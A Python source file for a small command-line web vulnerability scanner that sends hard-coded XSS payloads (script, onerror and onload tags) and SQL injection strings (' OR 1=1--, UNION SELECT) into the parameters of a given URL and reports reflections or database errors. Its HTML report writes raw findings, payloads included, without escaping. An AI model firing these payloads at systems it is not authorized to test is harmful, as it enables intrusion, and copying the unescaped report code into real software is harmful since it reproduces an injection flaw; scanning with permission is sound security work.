import requests
import argparse
import threading
import os
from urllib.parse import urljoin
from datetime import datetime

# Colors for terminal output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'

# Payloads for testing vulnerabilities
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "<svg/onload=alert('XSS')>",
    "<body onload=alert('XSS')>",
    "<iframe src=javascript:alert('XSS')>",
]

SQLI_PAYLOADS = [
    "' OR 1=1--",
    '" OR 1=1--',
    "admin'--",
    "' UNION SELECT NULL, version()--",
    "' AND 1=2 UNION SELECT null, null--",
]

# Function to write logs to a file
def write_log(log_message):
    log_dir = "logs"
    os.makedirs(log_dir, exist_ok=True)
    log_file = os.path.join(log_dir, "cyber_prasanna_log.txt")

    with open(log_file, "a") as f:
        f.write(f"[{datetime.now()}] {log_message}\n")

# Function to generate HTML report
def generate_report(vulnerabilities):
    report_dir = "reports"
    os.makedirs(report_dir, exist_ok=True)
    report_file = os.path.join(report_dir, "cyber_prasanna_report.html")

    with open(report_file, "w") as f:
        f.write("<html><head><title>Cyber_prasanna Report</title></head><body>")
        f.write("<h1>Cyber_prasanna Vulnerability Report</h1>")
        f.write("<ul>")
        for vuln in vulnerabilities:
            f.write(f"<li>{vuln}</li>")
        f.write("</ul>")
        f.write("</body></html>")

    print(f"{Colors.OKBLUE}[INFO]{Colors.ENDC} Report generated at {report_file}")

# Function to test for XSS
def test_xss(url, params, headers, vulnerabilities):
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Testing for XSS at {url}")
    for payload in XSS_PAYLOADS:
        for param in params:
            test_data = params.copy()
            test_data[param] = payload
            try:
                response = requests.get(url, params=test_data, headers=headers, timeout=5)
                if payload in response.text:
                    message = f"[VULNERABLE] XSS found with payload: {payload} on parameter: {param}"
                    print(f"{Colors.OKGREEN}{message}{Colors.ENDC}")
                    vulnerabilities.append(message)
                    write_log(message)
            except requests.RequestException as e:
                print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} Request failed: {e}")

# Function to test for SQL Injection
def test_sqli(url, params, headers, vulnerabilities):
    print(f"{Colors.HEADER}[INFO]{Colors.ENDC} Testing for SQL Injection at {url}")
    for payload in SQLI_PAYLOADS:
        for param in params:
            test_data = params.copy()
            test_data[param] = payload
            try:
                response = requests.get(url, params=test_data, headers=headers, timeout=5)
                if any(error in response.text.lower() for error in ["sql syntax", "mysql_fetch", "pg_fetch", "syntax error"]):
                    message = f"[VULNERABLE] SQL Injection found with payload: {payload} on parameter: {param}"
                    print(f"{Colors.OKGREEN}{message}{Colors.ENDC}")
                    vulnerabilities.append(message)
                    write_log(message)
            except requests.RequestException as e:
                print(f"{Colors.FAIL}[ERROR]{Colors.ENDC} Request failed: {e}")

# Function to run scans in threads
def run_scan(scan_func, url, params, headers, vulnerabilities):
    scan_func(url, params, headers, vulnerabilities)

# Main function
def main():
    print(f"{Colors.OKBLUE}========================================{Colors.ENDC}")
    print(f"{Colors.HEADER}     Welcome to Cyber_Prasanna Tool     {Colors.ENDC}")
    print(f"{Colors.OKBLUE}========================================{Colors.ENDC}")

    parser = argparse.ArgumentParser(description="Cyber_prasanna - Vulnerability Detection Tool")
    parser.add_argument("--url", required=True, help="Target URL to test")
    parser.add_argument("--scan", required=True, help="Comma-separated list of scans (xss, sqli)")
    parser.add_argument("--params", required=False, nargs='+', help="Parameters to test (key=value pairs)")
    parser.add_argument("--headers", required=False, nargs='+', help="Custom headers (key=value pairs)")
    args = parser.parse_args()

    # Parse input parameters
    url = args.url
    scans = args.scan.split(',')
    params = {}
    headers = {}
    vulnerabilities = []

    if args.params:
        for param in args.params:
            key, value = param.split('=')
            params[key] = value

    if args.headers:
        for header in args.headers:
            key, value = header.split('=')
            headers[key] = value

    # Run scans in threads
    threads = []
    if "xss" in scans:
        t = threading.Thread(target=run_scan, args=(test_xss, url, params, headers, vulnerabilities))
        threads.append(t)
        t.start()

    if "sqli" in scans:
        t = threading.Thread(target=run_scan, args=(test_sqli, url, params, headers, vulnerabilities))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    # Generate report
    if vulnerabilities:
        generate_report(vulnerabilities)
    else:
        print(f"{Colors.OKBLUE}[INFO]{Colors.ENDC} No vulnerabilities found.")

if __name__ == "__main__":
    main()